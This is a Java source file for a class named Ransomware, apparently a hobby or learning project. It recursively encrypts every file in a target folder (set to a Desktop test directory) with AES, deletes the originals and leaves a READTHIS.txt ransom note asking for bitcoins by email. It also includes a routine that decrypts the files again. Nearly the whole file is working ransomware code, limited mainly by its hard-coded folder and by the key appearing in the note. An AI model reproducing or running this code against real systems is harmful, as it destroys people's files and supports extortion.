import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Base64;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

/**
 * 
 * @author Gabriel
 *
 */
public class Ransomware {

	private KeyPairGenerator keyPairGen;
	private KeyPair pair;
	private Cipher cipher;
	private File mainDirectory;
	private int mode;
	private SecretKey secretKey;

	private static final int ENCRYPT = 0;
	private static final int DECRYPT = 1;

	public Ransomware() {
		setMainDirectory(new File(System.getProperty("user.home") + "\\Desktop\\Test"));
	}

	/**
	 * Kicks off the encryption
	 */
	public void beginEncryption() {
		mode = ENCRYPT;
		generateKey();
		if (mainDirectory.exists() && mainDirectory.isDirectory()) {
			decryptEncrypt(mainDirectory.listFiles());
		}
		leaveNote();
	}

	/**
	 * Kicks off the decryption
	 * 
	 * References:
	 * {@link https://gist.github.com/destan/b708d11bd4f403506d6d5bb5fe6a82c5}
	 */
	public void beginDecryption(String secretKeyString) {
		mode = DECRYPT;
		secretKeyString = secretKeyString.replaceAll("\\n", "").replace("\\r", "")
				.replace("-----BEGIN PRIVATE KEY-----", "").replace("-----END PRIVATE KEY-----", "");
		System.out.println(secretKeyString);
		try {
			SecretKey secretKey = new SecretKeySpec(Base64.getDecoder().decode(secretKeyString), 0,
					Base64.getDecoder().decode(secretKeyString).length, "AES");
			cipher = Cipher.getInstance("AES");
			cipher.init(Cipher.DECRYPT_MODE, secretKey);
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		if (mainDirectory.exists() && mainDirectory.isDirectory()) {
			decryptEncrypt(mainDirectory.listFiles());
		}
	}

	/**
	 * Grabs all files and encrypts them. References:
	 * {@link https://www.geeksforgeeks.org/java-program-list-files-directory-nested-sub-directories-recursive-approach/}
	 * 
	 */
	public void decryptEncrypt(File[] files) {
		for (int index = 0; index < files.length; index++) {
			if (files[index].isDirectory()) {
				File directory = files[index];
				new Thread() {

					@Override
					public void run() {
						decryptEncrypt(directory.listFiles());
					}
				}.start();
			} else if (files[index].isFile()) {
				switch (mode) {
				case ENCRYPT:
					encryptFile(files[index]);
					break;
				case DECRYPT:
					if (files[index].getName().contains(".cof")) {
						decryptFile(files[index]);
					}
					break;
				}

			}
		}

	}

	private void decryptFile(File encryptedFile) {
		byte[] decryptedBytes = null;
		try {
			System.out.print(getFileInBytes(encryptedFile).length % 16);
			decryptedBytes = cipher.doFinal(getFileInBytes(encryptedFile));
			File decryptedFile = new File(encryptedFile.getPath().replace(".cof", ""));
			writeToFile(decryptedFile, decryptedBytes);
			encryptedFile.delete();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return;
		} catch (IllegalBlockSizeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (BadPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	/**
	 * Generates the key pair. References:
	 * {@link https://www.novixys.com/blog/java-aes-example/}
	 */
	private void generateKey() {
		try {
			KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
			keyGenerator.init(new SecureRandom());
			secretKey = keyGenerator.generateKey();
			setCipher(Cipher.getInstance("AES"));
			cipher.init(Cipher.ENCRYPT_MODE, secretKey);

		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * Takes a file and encrypts it.
	 * 
	 * @param file - The file to encrypt
	 */
	private void encryptFile(File file) {
		byte[] encryptedBytes = null;
		try {
			encryptedBytes = cipher.doFinal(getFileInBytes(file));
			File encryptedFile = new File(file.getPath() + ".cof");
			writeToFile(encryptedFile, encryptedBytes);
			file.delete();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return;
		} catch (IllegalBlockSizeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (BadPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * References:
	 * {@link https://mkyong.com/java/java-asymmetric-cryptography-example/}
	 * 
	 * @param file - The file to convert
	 * @throws IOException
	 * 
	 */
	private byte[] getFileInBytes(File file) throws IOException {
		FileInputStream fis = new FileInputStream(file);
		byte[] fileBytes = new byte[(int) file.length()];
		fis.read(fileBytes);
		fis.close();
		return fileBytes;
	}

	/**
	 * References:
	 * {@link https://mkyong.com/java/java-asymmetric-cryptography-example/}
	 * 
	 * @param file - The file to output to
	 * @throws IOException
	 * 
	 */
	private void writeToFile(File output, byte[] bytesToWrite) throws IOException {
		FileOutputStream fos = new FileOutputStream(output);
		fos.write(bytesToWrite);
		fos.close();
		return;
	}

	/**
	 * Encodes the private key in base64 and saves it to a file
	 * 
	 */
	private void leaveNote() {
		String note = "To whom concern it may,"
				+ "\r\nAll files in your base are belong to a very strong algorithm. Please do not attempt "
				+ "to fix your files, it does not recover you. \r\nPlease send an email to customerService@cryptoCoffee.com "
				+ "with your name, bitcoins and this code: \r\n\r\n"
				+ Base64.getEncoder().encodeToString(secretKey.getEncoded())
				+ "\r\n\r\nAfter send you email with the bitcoins, we promptly "
				+ "will direction you on how to recover precious files. Keep faith in us, we will help you.\r\nAll systems unsafe,"
				+ "\r\nCryptoCoffee";
		try {
			writeToFile(new File(mainDirectory + "\\READTHIS.txt"), note.getBytes());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public KeyPairGenerator getKeyPairGen() {
		return keyPairGen;
	}

	public void setKeyPairGen(KeyPairGenerator keyPairGen) {
		this.keyPairGen = keyPairGen;
	}

	public KeyPair getPair() {
		return pair;
	}

	public void setPair(KeyPair pair) {
		this.pair = pair;
	}

	public Cipher getCipher() {
		return cipher;
	}

	public void setCipher(Cipher cipher) {
		this.cipher = cipher;
	}

	public File getMainDirectory() {
		return mainDirectory;
	}

	public void setMainDirectory(File mainDirectory) {
		this.mainDirectory = mainDirectory;
	}
}
